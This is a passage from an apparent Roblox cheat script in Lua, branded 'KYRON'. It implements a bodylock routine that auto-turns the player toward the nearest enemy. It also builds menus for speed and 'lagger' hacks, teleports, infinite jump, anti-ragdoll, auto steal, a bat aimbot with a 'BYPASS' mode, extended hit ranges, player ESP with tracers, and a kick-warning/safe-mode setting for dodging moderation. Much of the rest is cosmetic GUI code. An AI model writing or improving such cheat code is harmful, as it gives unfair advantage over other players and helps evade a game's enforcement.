                  if magnitude <= _G._KYRONLookAtEnemyRadius and magnitude < huge then
                    huge = magnitude
                    v92 = humanoidRootPart
                  end
                end
              end
            end

            return v92
          end

          local function start()
            stop()
            if not _G._KYRONLookAtEnemyEnabled then
              return
            end
            local character = localPlayer.Character
            local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
            character = character and character:FindFirstChildOfClass("Humanoid")
            if not humanoidRootPart or not character or character.Health <= 0 then
              return
            end
            local part = Instance.new("Part")
            part.Name = "KYRONLookAtEnemyAnchor"
            part.Size = Vector3.new(1, 1, 1)
            part.Transparency = 1
            part.CanCollide = false
            part.Anchored = true
            part.CFrame = humanoidRootPart.CFrame
            part.Parent = workspace:FindFirstChild("Terrain") or workspace
            local attachment = Instance.new("Attachment")
            attachment.Name = "KYRONLookAtEnemyAttachment"
            attachment.Parent = humanoidRootPart
            local attachment2 = Instance.new("Attachment")
            attachment2.Parent = part
            local alignOrientation = Instance.new("AlignOrientation")
            alignOrientation.Name = "KYRONLookAtEnemyOrientation"
            alignOrientation.Mode = Enum.OrientationAlignmentMode.TwoAttachment
            alignOrientation.Attachment0 = attachment
            alignOrientation.Attachment1 = attachment2
            alignOrientation.MaxTorque = 999999
            alignOrientation.MaxAngularVelocity = 999999
            alignOrientation.Responsiveness = 200
            alignOrientation.Enabled = false
            alignOrientation.Parent = part
            local v92 = KYRONLookAtEnemy
            local v93 = KYRONLookAtEnemy
            KYRONLookAtEnemy.anchor = part
            v92.attachment = attachment
            v93.align = alignOrientation
            KYRONLookAtEnemy.diedConn = character.Died:Connect(stop)

            KYRONLookAtEnemy.conn = RunService.Heartbeat:Connect(function()
              do
                local character2 = localPlayer.Character
                local v94 = character2 and character2:FindFirstChild("HumanoidRootPart")
                character2 = character2 and character2:FindFirstChildOfClass("Humanoid")
                if not _G._KYRONLookAtEnemyEnabled or not v94 or not character2 or character2.Health <= 0 then
                  stop()
                  return
                end
                local v95 = fn75()

                if v95 and KYRONLookAtEnemy.anchor and KYRONLookAtEnemy.align then
                  character2.AutoRotate = false
                  KYRONLookAtEnemy.align.Enabled = true
                  local vector = Vector3.new(v95.Position.X, v94.Position.Y, v95.Position.Z)
                  KYRONLookAtEnemy.anchor.CFrame = CFrame.lookAt(v94.Position, vector)
                else
                  character2.AutoRotate = true
                  KYRONLookAtEnemy.align.Enabled = false
                end
              end
            end)
          end

          KYRONLookAtEnemy.Start = start
          KYRONLookAtEnemy.Stop = stop

          KYRONLookAtEnemy.SetEnabled = function(arg)
            _G._KYRONLookAtEnemyEnabled = arg == true

            if _G._KYRONLookAtEnemyEnabled then
              start()
            else
              stop()
            end
          end

          localPlayer.CharacterAdded:Connect(function()
            if _G._KYRONLookAtEnemyEnabled then
              task.delay(0.15, start)
            end
          end)
        end


        fn74()
        -- SPEED: speed / lagger / auto-carry configuration
        Speed = createScrollingFrame("Speed")
        createTextLabel(Speed, "Speed Configuration")
        fn63(Speed, "Normal Speed", { value = tostring(movementSpeedSettings.NS) })
        fn63(Speed, "Carry Speed", { value = tostring(movementSpeedSettings.CS) })
        local speedMode
        speedMode, v88, v89 = fn66(Speed, "Speed Mode", "Normal")
        fn63(Speed, "Lagger Normal Speed", { value = tostring(movementSpeedSettings.LG_C) })
        fn63(Speed, "Lagger Carry Speed", { value = tostring(movementSpeedSettings.LG_N) })
        local laggerModeDisplay
        laggerModeDisplay, v90, v91 = fn66(Speed, "Lagger Mode Display", "Lagger Normal")
        fn68(Speed, "Auto Carry Mode", "ON STEAL", "WHEN NEAR", { toggle = true })
        fn78(Speed, "Auto Carry Speed", function(arg)
          _G._KYRONAutoCarrySpeedEnabled = arg == true
          if _G._KYRONAutoCarrySpeedEnabled then
            pcall(_G._KYRONStartAutoCarrySpeed)
          else
            pcall(_G._KYRONStopAutoCarrySpeed)
          end
          pcall(saveKYRONSettings)
        end)
        fn78(Speed, "Auto Carry on Enemy Base", function(arg)
          _G._KYRONAutoCarryEnemyBaseEnabled = arg == true
          if _G._KYRONAutoCarryEnemyBaseEnabled then
            pcall(_G._KYRONStartAutoCarryEnemyBase)
          else
            pcall(_G._KYRONStopAutoCarryEnemyBase)
          end
          pcall(saveKYRONSettings)
        end)
        fn63(Speed, "Enemy Base Range", { value = tostring(_G._KYRONAutoCarryEnemyBaseRange) })

        -- MOVEMENT: teleport, jump, bodylock
        Movement = createScrollingFrame("Movement")
        createTextLabel(Movement, "TP Down")
        fn63(Movement, "TP Down", { toggle = true })
        fn63(Movement, "Auto TP Down", { toggle = true })
        fn63(Movement, "Auto TP Height", { value = "10" })
        createTextLabel(Movement, "Jump")
        fn63(Movement, "Infinite Jump", { toggle = true })
        fn63(Movement, "Anti Ragdoll", { toggle = true })
        createTextLabel(Movement, "Bodylock")
        fn63(Movement, "Bodylock", { toggle = true })
        fn63(Movement, "Bodylock Radius", { value = tostring(_G._KYRONLookAtEnemyRadius) })
        Combat = createScrollingFrame("Combat")
        createTextLabel(Combat, "Steal Configuration")
        fn63(Combat, "Radius", { value = "60" })
        fn63(Combat, "Ragdoll Steal", { toggle = true })
        _G._KYRONBuildNormalPauseSelector(Combat)
        fn63(Combat, "SEMI Range", { value = "8.7" })
        fn68(Combat, "Auto Steal", "NORMAL STEAL V3", "SEMI", { toggle = true })
        createTextLabel(Combat, "Bat Aimbot")
        fn68(Combat, "Bat Aimbot", "DEFAULT", "BYPASS", { toggle = true })
        fn63(Combat, "Auto Bat Speed", { value = "58" })
        fn63(Combat, "Auto Swing", { toggle = true })
        fn63(Combat, "Mirror TP", { toggle = true })
        createTextLabel(Combat, "TP Bat")
        fn68(Combat, "TP Bat", "V1", "V2", { toggle = true })
        fn63(Combat, "TP Swing Delay", { value = string.format("%.3f", _G._KYRONTpBatSwingDelay) })
        fn63(Combat, "TP Bat V3", { toggle = true })
        fn63(Combat, "TP Bat V4 Phantom", { toggle = true })
        createTextLabel(Combat, "Auto Path")
        fn63(Combat, "Auto Left", { toggle = true })
        fn63(Combat, "Auto Right", { toggle = true })
        fn63(Combat, "Match Speed", { toggle = true })
        createTextLabel(Combat, "Counters")
        fn68(Combat, "Bat Counter", "V1", "V2", { toggle = true })
        fn63(Combat, "Medusa Counter", { toggle = true })
        createTextLabel(Combat, "Hard Hit")
        fn63(Combat, "Hard Hit", { toggle = true })
        fn63(Combat, "Hard Hit Range", { value = "10" })
        createTextLabel(Combat, "Perfect Hit")
        fn63(Combat, "Perfect Hit", { toggle = true })
        fn63(Combat, "Perfect Hit Range", { value = "175" })
        Keybinds = createScrollingFrame("Keybinds")
        createTextLabel(Keybinds, "Movement Keybinds")
        fn63(Keybinds, "Speed Key", { key = "Q" })
        fn63(Keybinds, "Lagger Mode Key", { key = "R" })
        fn63(Keybinds, "Drop Key", { key = "X" })
        fn63(Keybinds, "TP Down Key", { key = "F" })
        fn63(Keybinds, "Insta Reset Key", { key = "G" })
        createTextLabel(Keybinds, "Combat Keybinds")
        fn63(Keybinds, "Bat Aimbot Key", { key = "E" })
        fn63(Keybinds, "TP Bat Key", { key = "V" })
        fn63(Keybinds, "Auto Left Key", { key = "Z" })
        fn63(Keybinds, "Auto Right Key", { key = "C" })
        createTextLabel(Keybinds, "Interface Keybinds")
        fn63(Keybinds, "UI Toggle Key", { key = "N" })
        Controller = createScrollingFrame("Controller")
        fn63(Controller, "RESET ALL CONTROLLER", { button = true })
        createTextLabel(Controller, "Movement Controller")
        fn63(Controller, "Speed Key", { key = "..." })
        fn63(Controller, "Lagger Mode Key", { key = "..." })
        fn63(Controller, "Drop Key", { key = "..." })
        fn63(Controller, "TP Down Key", { key = "..." })
        createTextLabel(Controller, "Combat Controller")
        fn63(Controller, "Bat Aimbot Key", { key = "..." })
        fn63(Controller, "TP Bat Key", { key = "..." })
        fn63(Controller, "Auto Left Key", { key = "..." })
        fn63(Controller, "Auto Right Key", { key = "..." })
        createTextLabel(Controller, "Interface Controller")
        fn63(Controller, "UI Toggle Key", { key = "..." })

        local function fn75()
          _G._KYRONNeonWhiteToolsEnabled = _G._KYRONNeonWhiteToolsEnabled == true

          if _G._KYRONNeonWhiteTools and _G._KYRONNeonWhiteTools.SetEnabled then
            pcall(_G._KYRONNeonWhiteTools.SetEnabled, false)
          end

          local KYRONNeonWhiteTools = {
            enabled = false,
            tracked = setmetatable({}, { __mode = "k" }),
            watchers = setmetatable({}, { __mode = "k" }),
          }

          _G._KYRONNeonWhiteTools = KYRONNeonWhiteTools

          local function fn76(arg)
            if not arg or not arg:IsA("Tool") then
              return false
            end
            local str10 = arg.Name:lower()
            return str10:find("bat") ~= nil or str10:find("slap") ~= nil or str10:find("medusa") ~= nil
          end

          local function fn77(arg)
            local tbl44 = { node = arg, values = {} }
            local tbl45

            if arg:IsA("BasePart") then
              tbl45 = { "Color", "Material" }
            elseif arg:IsA("MeshPart") then
              tbl45 = { "Color", "Material", "TextureID" }
            elseif arg:IsA("SpecialMesh") then
              tbl45 = { "VertexColor", "TextureId" }
            elseif arg:IsA("Decal") or arg:IsA("Texture") then
              tbl45 = { "Transparency" }
            elseif arg:IsA("ParticleEmitter") or arg:IsA("Beam") or arg:IsA("Trail") then
              tbl45 = { "Color" }
            elseif arg:IsA("PointLight") or arg:IsA("SpotLight") or arg:IsA("SurfaceLight") then
              tbl45 = { "Color" }
            elseif arg:IsA("Highlight") then
              tbl45 = { "FillColor", "OutlineColor" }
            else
              if not arg:IsA("SurfaceAppearance") then
                return nil
              end
              tbl45 = { "Parent" }
            end

            for _, v92 in ipairs(tbl45) do
              pcall(function()
                tbl44.values[v92] = arg[v92]
              end)
            end

            return tbl44
          end

          local function fn78(arg)
            local node = arg.node

            if node:IsA("MeshPart") then
              node.Color = Color3.new(1, 1, 1)
              node.Material = Enum.Material.Neon
              node.TextureID = ""
            elseif node:IsA("BasePart") then
              node.Color = Color3.new(1, 1, 1)
              node.Material = Enum.Material.Neon
            elseif node:IsA("SpecialMesh") then
              node.VertexColor = Vector3.new(1, 1, 1)
              node.TextureId = ""
            elseif node:IsA("Decal") or node:IsA("Texture") then
              node.Transparency = 1
            elseif node:IsA("ParticleEmitter") or node:IsA("Beam") or node:IsA("Trail") then
              node.Color = ColorSequence.new(Color3.new(1, 1, 1))
            elseif node:IsA("PointLight") or node:IsA("SpotLight") or node:IsA("SurfaceLight") then
              node.Color = Color3.new(1, 1, 1)
            elseif node:IsA("Highlight") then
              node.FillColor = Color3.new(1, 1, 1)
              node.OutlineColor = Color3.new(1, 1, 1)
            elseif node:IsA("SurfaceAppearance") then
              node.Parent = nil
            end
          end

          local function fn79(arg, arg2)
            local v92 = fn77(arg2)
            if not v92 then
              return
            end
            table.insert(arg.nodes, v92)
            pcall(fn78, v92)
          end

          local function fn80(arg, arg2)
            local v92 = KYRONNeonWhiteTools.tracked[arg]
            if not v92 then
              return
            end

            if v92.connection then
              v92.connection:Disconnect()
            end

            if arg2 then
              for _, node in ipairs(v92.nodes) do
                if node.node.Parent then
                  for k, value in pairs(node.values) do
                    pcall(function()
                      node.node[k] = value
                    end)
                  end
                end
              end
            end

            KYRONNeonWhiteTools.tracked[arg] = nil
          end

          local function fn81(child)
            if not KYRONNeonWhiteTools.enabled or KYRONNeonWhiteTools.tracked[child] or not fn76(child) then
              return
            end
            local tbl44 = { nodes = {} }
            KYRONNeonWhiteTools.tracked[child] = tbl44

            for _, descendant in ipairs(child:GetDescendants()) do
              fn79(tbl44, descendant)
            end

            tbl44.connection = child.DescendantAdded:Connect(function(descendant)
              if KYRONNeonWhiteTools.enabled then
                fn79(tbl44, descendant)
              end
            end)
          end

          local function fn82(arg)
            if not arg or KYRONNeonWhiteTools.watchers[arg] then
              return
            end
            KYRONNeonWhiteTools.watchers[arg] = arg.ChildAdded:Connect(fn81)

            for _, child in ipairs(arg:GetChildren()) do
              fn81(child)
            end
          end

          KYRONNeonWhiteTools.SetEnabled = function(arg)
            KYRONNeonWhiteTools.enabled = arg == true
            _G._KYRONNeonWhiteToolsEnabled = KYRONNeonWhiteTools.enabled

            if KYRONNeonWhiteTools.enabled then
              fn82(localPlayer.Character)
              fn82(localPlayer:FindFirstChildOfClass("Backpack"))
            else
              for k in pairs(KYRONNeonWhiteTools.tracked) do
                fn80(k, true)
              end

              for k, watcher in pairs(KYRONNeonWhiteTools.watchers) do
                watcher:Disconnect()
                KYRONNeonWhiteTools.watchers[k] = nil
              end
            end
          end

          localPlayer.ChildAdded:Connect(function(child)
            if KYRONNeonWhiteTools.enabled and child:IsA("Backpack") then
              fn82(child)
            end
          end)

          localPlayer.CharacterAdded:Connect(function(character)
            if KYRONNeonWhiteTools.enabled then
              for k in pairs(KYRONNeonWhiteTools.tracked) do
                fn80(k, false)
              end

              for k, watcher in pairs(KYRONNeonWhiteTools.watchers) do
                watcher:Disconnect()
                KYRONNeonWhiteTools.watchers[k] = nil
              end

              fn82(character)

              task.defer(function()
                if KYRONNeonWhiteTools.enabled then
                  fn82(localPlayer:FindFirstChildOfClass("Backpack"))
                end
              end)
            end
          end)
        end

        fn75()
        Utility = createScrollingFrame("Utility")
        createTextLabel(Utility, "Players")
        local esp = fn63(Utility, "ESP", { arrow = true, toggle = true })
        local showTracer = fn63(Utility, "Show Tracer", { toggle = true })
        fn63(Utility, "Anti TP ESP", { toggle = true })
        fn63(Utility, "Ragdoll Countdown", { toggle = true })
        local arrowButton = esp:FindFirstChild("ArrowButton")

        if arrowButton then
          fn67(esp, showTracer, arrowButton)
        end

        createTextLabel(Utility, "Visual")
        fn68(Utility, "Font", "DEFAULT", "PIXEL")
        fn63(Utility, "Neon White Tools", { toggle = true })
        fn69(Utility)
      end

      local function fn66(parent)
        local frame4 = Instance.new("Frame")
        frame4.Name = "Anim Pack"
        frame4.BackgroundTransparency = 1
        frame4.BorderSizePixel = 0
        frame4.Size = UDim2.new(1, -4, 0, 52)
        frame4.ZIndex = 3
        frame4.Parent = parent
        local gothamBlack = Enum.Font.GothamBlack
        local text = tbl37.text
        local animPack = fn58(frame4, "Anim Pack", 16, UDim2.new(0, 2, 0, 0), gothamBlack, text)
        animPack.Size = UDim2.new(1, 0, 0, 16)
        animPack.ZIndex = 4
        local frame5 = Instance.new("Frame")
        frame5.Name = "AnimPackPill"
        frame5.BackgroundTransparency = 1
        frame5.BorderSizePixel = 0
        frame5.Size = UDim2.new(1, 0, 0, 28)
        frame5.Position = UDim2.new(0, 0, 0, 22)
        frame5.ZIndex = 10
        frame5.Parent = frame4
        createUIStroke(frame5)
        local v92 = createTextButton(frame5, "<", 34)
        v92.Name = "AnimPackPrev"
        local udim22 = UDim2.new
        local v93 = 0
        local v94 = 4
        fn62(v92, UDim2.new(0, 34, 1, 0), udim22(v93, v94, 0, 0))
        local off = createTextButton(frame5, "OFF", 0)
        off.Name = "AnimPackValue"
        local udim23 = UDim2.new
        local v95 = 0
        fn62(off, UDim2.new(1, -84, 1, 0), udim23(v95, 42, 0, 0))
        local v96 = createTextButton(frame5, ">", 34)
        v96.Name = "AnimPackNext"
        local udim24 = UDim2.new
        local v97 = 0
        fn62(v96, UDim2.new(0, 34, 1, 0), udim24(1, -38, v97, 0))
      end

      fn66(Utility)
      fn63(Utility, "Try Hard Animation", { toggle = true })
      createTextLabel(Utility, "Performance")
      fn63(Utility, "Stretch Res", { toggle = true })
      fn63(Utility, "Anti-Lag", { toggle = true })
      fn63(Utility, "Potato Graphics", { toggle = true })
      fn63(Utility, "FOV Change", { toggle = true })
      fn63(Utility, "FOV Value", { value = "120" })
      createTextLabel(Utility, "KYRON Skin")
      fn63(Utility, "KYRON Skin", { toggle = true })

      local function fn67()
        local flag29 = KYRONSafeModeEnabled == true
        local open = createTextButton(fn63(Utility, "Skin Gallery"), "OPEN", 66)
        open.Name = "OpenSkinGallery"
        open.Position = UDim2.new(1, -76, 0.5, -12)
        open.TextColor3 = tbl37.accent
        local KYRONSkinGallery = screenGui:FindFirstChild("KYRONSkinGallery")

        if KYRONSkinGallery then
          KYRONSkinGallery:Destroy()
        end

        local canvasGroup = Instance.new("CanvasGroup")
        canvasGroup.Name = "KYRONSkinGallery"
        canvasGroup.AnchorPoint = Vector2.new(0.5, 0.5)
        canvasGroup.Position = UDim2.fromScale(0.5, 0.5)
        canvasGroup.Size = flag29 and UDim2.new(0, 280, 0, 300) or UDim2.new(0, 360, 0, 350)
        canvasGroup.BackgroundColor3 = tbl37.panel
        canvasGroup.BorderSizePixel = 0
        canvasGroup.Visible = false
        canvasGroup.ZIndex = 40
        canvasGroup.Parent = screenGui
        fn56(canvasGroup, 14)
        local uiGradient = Instance.new("UIGradient")
        uiGradient.Color = ColorSequence.new(tbl37.panel, tbl37.row)
        uiGradient.Rotation = 35
        uiGradient.Parent = canvasGroup
        local frame4 = Instance.new("Frame")
        frame4.BackgroundTransparency = 1
        frame4.Size = UDim2.new(1, -28, 0, 35)
        frame4.Position = UDim2.new(0, 14, 0, 8)
        frame4.ZIndex = 121
        frame4.Parent = canvasGroup
        frame4.Active = true
        local v92 = fn58
        local n34 = flag29 and 16 or 18
        local gothamBlack = Enum.Font.GothamBlack
        local text = tbl37.text
        local KYRONSkin = v92(frame4, "KYRON SKIN", n34, UDim2.new(0, 0, 0, 2), gothamBlack, text)
        KYRONSkin.ZIndex = 122
        local v93 = tbl38.gallery(canvasGroup, frame4, KYRONSkin)
        local v94 = createTextButton(frame4, "×", 25)
        v94.Name = "CloseSkinGallery"
        v94.TextSize = 20
        v94.Position = UDim2.new(1, -32, 0, 7)
        v94.ZIndex = 123
        v94.BackgroundTransparency = 1
        local uiStroke = v94:FindFirstChildOfClass("UIStroke")

        if uiStroke then
          uiStroke:Destroy()
        end

        local flag30 = false
        local v95 = nil
        local v96 = nil
        local v97 = nil

        local function fn68(arg)
          local n35 = arg.Position - v95
          canvasGroup.Position = UDim2.new(v96.X.Scale, v96.X.Offset + n35.X, v96.Y.Scale, v96.Y.Offset + n35.Y)
        end

        frame4.InputBegan:Connect(function(input)
          if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then
            return
          end
          local position2 = input.Position
          local position3 = canvasGroup.Position
          flag30 = true
          v95 = position2
          v96 = position3
          v97 = input

          input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
              flag30 = false
            end
          end)
        end)

        frame4.InputChanged:Connect(function(input)
          if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            v97 = input
          end
        end)

        UserInputService.InputChanged:Connect(function(input)
          if flag30 and input == v97 then
            fn68(input)
          end
        end)

        local scrollingFrame = Instance.new("ScrollingFrame")
        scrollingFrame.Name = "PresetCards"
        scrollingFrame.BackgroundTransparency = 1
        scrollingFrame.BorderSizePixel = 0
        scrollingFrame.Position = UDim2.new(0, 14, 0, 50)
        scrollingFrame.Size = UDim2.new(1, -28, 1, -64)
        scrollingFrame.CanvasSize = UDim2.new()
        scrollingFrame.ScrollBarThickness = 0
        scrollingFrame.ScrollBarImageColor3 = tbl37.accent
        scrollingFrame.ZIndex = 121
        scrollingFrame.Parent = canvasGroup
        local uiGridLayout = Instance.new("UIGridLayout")
        uiGridLayout.CellSize = flag29 and UDim2.new(0, 86, 0, 112) or UDim2.new(0, 106, 0, 134)
        uiGridLayout.CellPadding = flag29 and UDim2.new(0, 2, 0, 10) or UDim2.new(0, 4, 0, 5)
        uiGridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
        uiGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
        uiGridLayout.Parent = scrollingFrame

        uiGridLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
          scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, uiGridLayout.AbsoluteContentSize.Y + 4)
        end)

        local tbl44 = {}
        local n35 = 0
        local v98 = 0

        local function KYRONRefreshSkinGallery()
          local KYRONSkin2 = _G._KYRONSkin
          KYRONSkin2 = KYRONSkin2 and KYRONSkin2.GetPreset() or "KYRON"

          for _, v99 in ipairs(tbl44) do
            local visible = v99.name == KYRONSkin2
            v99.card:SetAttribute("Selected", visible)
            tbl38.tween(v99.card, "surface", 0.18, {
              BackgroundColor3 = visible and Color3.fromRGB(27, 27, 27) or Color3.fromRGB(15, 15, 15),
            })
            v99.stroke.Color = Color3.fromRGB(255, 255, 255)
            v99.stroke.Thickness = 1
            tbl38.tween(v99.stroke, "selection", 0.18, { Transparency = visible and 0.42 or 0.92 })
            v99.nameLabel.TextColor3 = visible and Color3.fromRGB(255, 255, 240) or Color3.fromRGB(175, 175, 175)
            v99.mark.Visible = visible
          end
        end

        _G._KYRONRefreshSkinGallery = KYRONRefreshSkinGallery

        local function fn69(arg, layoutOrder)
          local textButton2 = Instance.new("TextButton")
          textButton2.Name = arg .. "Preview"
          textButton2.LayoutOrder = layoutOrder
          textButton2.BackgroundColor3 = canvasGroup.BackgroundColor3
          textButton2.BackgroundTransparency = 0
          textButton2.BorderSizePixel = 0
          textButton2.Text = ""
          textButton2.AutoButtonColor = false
          textButton2.ZIndex = 122
          textButton2.Parent = scrollingFrame
          fn56(textButton2, 12)
          local uiStroke2 = Instance.new("UIStroke")
          uiStroke2.Color = Color3.fromRGB(60, 70, 100)
          uiStroke2.Transparency = 0.18
          uiStroke2.Parent = textButton2
          local viewportFrame = Instance.new("ViewportFrame")
          viewportFrame.Name = "AvatarPreview"
          viewportFrame.BackgroundColor3 = canvasGroup.BackgroundColor3
          viewportFrame.BackgroundTransparency = 1
          viewportFrame.BorderSizePixel = 0
          viewportFrame.Position = UDim2.new(0, 7, 0, 7)
          viewportFrame.Size = UDim2.new(1, -14, 1, -38)
          viewportFrame.Ambient = Color3.fromRGB(210, 210, 210)
          viewportFrame.LightColor = Color3.fromRGB(255, 255, 240)
          viewportFrame.LightDirection = Vector3.new(-1, -1, -1)
          viewportFrame.ZIndex = 123
          viewportFrame.Parent = textButton2
          fn56(viewportFrame, 8)
          local gothamMedium = Enum.Font.GothamMedium
          local accent = tbl37.accent
          local center = Enum.TextXAlignment.Center
          local v99 = fn58(viewportFrame, "LOADING\nPREVIEW", 10, UDim2.new(0, 0, 0, 0), gothamMedium, accent, center)
          v99.Size = UDim2.fromScale(1, 1)
          v99.TextYAlignment = Enum.TextYAlignment.Center
          v99.ZIndex = 124
          local gothamMedium2 = Enum.Font.GothamMedium
          local text2 = tbl37.text
          local center2 = Enum.TextXAlignment.Center
          local v100 = fn58(textButton2, arg, 10, UDim2.new(0, 24, 1, -26), gothamMedium2, text2, center2)
          v100.Size = UDim2.new(1, -16, 0, 19)
          v100.ZIndex = 123
          local frame5 = Instance.new("Frame", textButton2)
          frame5.Name = "SelectedMarker"
          frame5.Size = UDim2.new(0, 14, 0, 2)
          frame5.Position = UDim2.new(0.5, -9, 1, -4)
          frame5.BackgroundColor3 = Color3.fromRGB(240, 255, 255)
          frame5.BorderSizePixel = 0
          frame5.ZIndex = 124
          frame5.Visible = false
          fn56(frame5, 1)

          for _, v101 in ipairs({ textButton2, uiStroke2, viewportFrame, v100, frame5, v99 }) do
            v101:SetAttribute("_NoKYRONTheme", true)
          end

          textButton2.MouseEnter:Connect(function()
            tbl38.tween(textButton2, "surface", 0.14, { BackgroundColor3 = Color3.fromRGB(33, 33, 33) })
          end)

          textButton2.MouseLeave:Connect(function()
            tbl38.tween(textButton2, "surface", 0.14, {
              BackgroundColor3 = textButton2:GetAttribute("Selected") and Color3.fromRGB(27, 27, 27) or Color3.fromRGB(15, 15, 15),
            })
          end)

          local tbl45 = {
            name = arg,
            card = textButton2,
            stroke = uiStroke2,
            nameLabel = v100,
            mark = frame5,
            world = nil,
            rig = nil,
            joints = {},
            phase = layoutOrder * 0.47,
          }

          tbl44[#tbl44 + 1] = tbl45

          textButton2.Activated:Connect(function()
            local KYRONSkin2 = _G._KYRONSkin

            if KYRONSkin2 then
              KYRONSkin2.SetPreset(arg)
            end

            for _, v101 in ipairs(tbl44) do
              v101.selectStartedAt = nil
            end

            tbl45.selectStartedAt = os.clock()
            KYRONRefreshSkinGallery()
          end)

          task.spawn(function()
            local KYRONSkin2 = _G._KYRONSkin
            local createPreviewRig = KYRONSkin2 and KYRONSkin2.CreatePreviewRig and KYRONSkin2.CreatePreviewRig(arg)
            if not createPreviewRig or not viewportFrame.Parent then
              v99.Text = "PREVIEW\nUNAVAILABLE"
              return
            end

            for _, descendant in ipairs(createPreviewRig:GetDescendants()) do
              if descendant:IsA("BasePart") then
                descendant.Anchored = true
                descendant.CanCollide = false
              end
            end

            local worldModel = Instance.new("WorldModel")
            worldModel.Parent = viewportFrame
            createPreviewRig:PivotTo(CFrame.new())
            createPreviewRig.Parent = worldModel

            for _, v101 in ipairs({
              "Neck",
              "Waist",
              "RightShoulder",
              "LeftShoulder",
              "RightHip",
              "LeftHip",
            }) do
              local v102 = createPreviewRig:FindFirstChild(v101, true)

              if v102 and v102:IsA("Motor6D") then
                tbl45.joints[v101] = v102
              end
            end

            local boundingBox, v101 = createPreviewRig:GetBoundingBox()
            local camera = Instance.new("Camera")
            camera.FieldOfView = 70
            local position2 = boundingBox.Position
            local previewDistance = math.max(v101.X, v101.Y) * 1.7
            camera.CFrame = CFrame.new(position2 + Vector3.new(0, v101.Y * 0.06, previewDistance), position2)
            camera.Parent = viewportFrame
            viewportFrame.CurrentCamera = camera
            v99:Destroy()
            local v102 = tbl45
            tbl45.world = worldModel
            v102.rig = createPreviewRig
            local v103 = tbl45
            local v104 = tbl45
            local cFrame = camera.CFrame
            tbl45.camera = camera
            v103.baseCameraCFrame = cFrame
            v104.previewDistance = previewDistance
          end)
        end

        local KYRONSkin2 = _G._KYRONSkin

        if KYRONSkin2 then
          for i, preset in ipairs(KYRONSkin2.Presets) do
            fn69(preset, i)
          end
        end

        KYRONRefreshSkinGallery()

        RunService.RenderStepped:Connect(function(deltaTime)
          if not canvasGroup.Visible then
            return
          end

          if _G._KYRONVoltCompatibility then
            return
          end
          n35 = (n35 + deltaTime * 0.8) % 6.2831853071795862
          v98 += deltaTime

          for _, v99 in ipairs(tbl44) do
            if v99.rig and v99.rig.Parent then
              local n36 = v98 * 1.7 + v99.phase
              local v100 = math.sin(n36)
              local n37 = math.cos(n36 * 2) * 0.035
              local selectStartedAt = v99.selectStartedAt

              if selectStartedAt then
                local selectStartedAt2 = v99.selectStartedAt
                selectStartedAt = os.clock() - selectStartedAt2
              end

              selectStartedAt = selectStartedAt or nil
              local n38 = selectStartedAt and math.clamp(selectStartedAt / 0.65, 0, 1) or 0
              local n39 = (1 - (1 - n38) ^ 3) * 6.2831853071795862
              v99.rig:PivotTo(CFrame.new(0, n37, 0) * CFrame.Angles(0, n35 + n39, 0))
              local joints = v99.joints

              if joints.Neck then
                local v101 = 0
                local rad = math.rad
                joints.Neck.Transform = CFrame.Angles(math.rad(10 * v100), v101, rad(2 * v100))
              end

              if joints.Waist then
                local rad = math.rad
                local n40 = 3 * v100
                joints.Waist.Transform = CFrame.Angles(0, math.rad(10 * v100), rad(n40))
              end

              if joints.RightShoulder then
                local rad = math.rad
                joints.RightShoulder.Transform = CFrame.Angles(math.rad(5 * v100), 0, rad(2 * v100))
              end

              if joints.LeftShoulder then
                local rad = math.rad
                joints.LeftShoulder.Transform = CFrame.Angles(math.rad(-5 * v100), 0, rad(-2 * v100))
              end

              if joints.RightHip then
                joints.RightHip.Transform = CFrame.Angles(math.rad(-2 * v100), 0, 0)
              end

              if joints.LeftHip then
                local v101 = 0
                joints.LeftHip.Transform = CFrame.Angles(math.rad(2 * v100), v101, 0)
              end

              if v99.camera and v99.baseCameraCFrame then
                local n40 = 1 - (1 - n38) ^ 2

                if 0 < n40 then
                  local head = v99.rig:FindFirstChild("Head")

                  if head and head:IsA("BasePart") then
                    local n41 = head.Position + Vector3.new(0, 0.04, 0)
                    local n42 = math.max(1.5, (v99.previewDistance or 7) * (1 - 0.68 * n40))
                    v99.camera.FieldOfView = 70 - 18 * n40
                    v99.camera.CFrame = CFrame.new(n41 + Vector3.new(0, 0.05, n42), n41)
                  end
                else
                  v99.camera.FieldOfView = 42
                  v99.camera.CFrame = v99.baseCameraCFrame
                end
              end
            end
          end
        end)

        open.Activated:Connect(function()
          KYRONRefreshSkinGallery()
          v93(true)
        end)

        v94.Activated:Connect(function()
          v93(false)
        end)
      end

      fn67()
      local Settings
      Settings = createScrollingFrame("Settings")
      createTextLabel(Settings, "Safety")
      fn63(Settings, "Safe Mode", { toggle = true })
      fn63(Settings, "Kick Warning", { toggle = true })
      createTextLabel(Settings, "Mobile Buttons")
      fn63(Settings, "Advanced Lagger Button", { toggle = true }).Visible = KYRONSafeModeEnabled
      fn63(Settings, "Circle Buttons", { toggle = true })
      local v92, moveButtons, resetButtons

      do
        local hideMobButtons = fn63(Settings, "Hide Mob Buttons", { arrow = true })
        local frame4 = Instance.new("Frame")
        frame4.Name = "HideSpecificButtonsList"
        frame4.BackgroundTransparency = 1
        frame4.BorderSizePixel = 0
        frame4.Size = UDim2.new(1, -4, 0, 0)
        frame4.Visible = false
        frame4.ClipsDescendants = true
        frame4.ZIndex = 4
        frame4.Parent = Settings
        local uiListLayout = Instance.new("UIListLayout")
        uiListLayout.Padding = UDim.new(0, 3)
        uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
        uiListLayout.Parent = frame4

        local tbl44 = {
          "Drop Brainrot",
          "Auto Left",
          "Bat Aimbot",
          "Auto Right",
          "TP Down",
          "Carry Speed",
          "TP Bat",
          "Lagger Mode",
          "Lagger Carry",
        }

        local tbl45 = {}

        local function KYRONRefreshSpecificButtonHideUI()
          local KYRONHiddenMobileButtons = _G._KYRONHiddenMobileButtons or {}
          local flag29 = #tbl44 > 0

          for _, v93 in ipairs(tbl44) do
            if KYRONHiddenMobileButtons[v93] ~= true then
              flag29 = false
              break
            end
          end

